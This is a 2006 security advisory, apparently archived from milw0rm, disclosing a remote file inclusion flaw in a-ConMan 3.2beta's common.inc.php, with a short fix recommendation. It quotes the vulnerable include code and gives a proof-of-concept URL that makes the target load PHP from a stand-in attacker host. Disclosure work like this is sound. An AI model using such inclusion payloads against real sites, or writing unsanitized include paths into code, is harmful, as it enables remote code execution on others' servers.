@@ -1,0 +1,82 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \
+ |    __)_ /    \  \//    ~    \/   |   \
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/                              .OR.ID
+ECHO_ADV_61$2006
+
+------------------------------------------------------------------------------
+[ECHO_ADV_61$2006] a-ConMan <= v3.2beta Remote File Inclusion
+------------------------------------------------------------------------------
+
+Author		: Ahmad Maulana a.k.a Matdhule
+Date Found	: November, 22nd 2006
+Location	: Indonesia, Jakarta
+web		: http://advisories.echo.or.id/adv/adv61-matdhule-2006.txt
+Critical Lvl	: Highly critical
+Impact		: System access
+Where		: From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+a-ConMan (Automated Content Management)
+
+Application	: a-ConMan (Automated Content Management)
+version		: 3.2beta
+URL		: http://sourceforge.net/projects/a-conman
+
+a-ConMan is a flexible database solution built to categorize and manage your image and video content. Giving you the ability to automate the building and updating for any type of content specific website within seconds. Utilizing one of the most advanced
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~~
+
+I found vulnerability at script common.inc.php
+
+-----------------------common.inc.php----------------------
+....
+<?php
+include_once($cm_basedir."/ez_sql.php");
+include_once($cm_basedir."/pg2ezsql.php");
+// include_once($cm_basedir."/functions.php");
+$ver = "3.1.1228";
+
+...
+----------------------------------------------------------
+
+Input passed to the "cm_basedir" parameter in common.inc.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+Proof Of Concept:
+~~~~~~~~~~~~~~~
+
+http://target.com/[a-conman_path]/php.incs/common.inc.php?cm_basedir=http://attacker.com/inject.txt?
+
+
+Solution:
+~~~~~~~
+- Sanitize variable $cm_basedir on common.inc.php.
+
+---------------------------------------------------------------------------
+Shoutz:
+~~~
+~ solpot a.k.a chris, J4mbi  H4ck3r thx for the hacking lesson    :)   
+~ y3dips,the_day,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous,str0ke
+~ bius, lapets, BlueSpy, NpR, h4ntu, thama, Fungky
+~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com
+~ Solpotcrew Comunity (#nyubicrew @ allindo.net), #e-c-h-o @irc.dal.net
+------------------------------------------------------------------------
+---
+Contact:
+~~~~
+ 
+     matdhule[at]gmail[dot]com
+     
+-------------------------------- [ EOF ]----------------------------------
+
+# milw0rm.com [2006-11-22]
